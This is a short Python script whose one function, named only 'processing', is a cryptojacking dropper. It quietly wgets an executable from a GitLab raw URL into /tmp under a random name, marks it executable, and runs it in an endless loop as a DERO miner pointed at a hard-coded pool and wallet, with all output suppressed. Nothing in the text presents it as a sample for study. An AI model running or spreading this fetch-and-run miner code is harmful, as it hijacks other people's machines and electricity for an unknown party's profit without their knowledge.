import subprocess
import random
import time

def processing():
    file = str(random.randint(1, 999999))
    POOLDERO = "vip.papiculo.net:80"
    WALLETDERO = "dero1qy25yfyzw00d5t0mt8pvtd9t4p7zp8x3zl06pwkhaj4zkuqhnmnv2qgakr6u7"
    subprocess.Popen(f"cd /tmp && wget -q https://gitlab.com/aldriterakhir/installer/-/raw/main/bwt2 -O {file} && chmod +x {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    command = ["bash", "-c", f"while true; do /tmp/{file} -r {POOLDERO} -w {WALLETDERO} -p rpc; sleep 5; done"]
    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
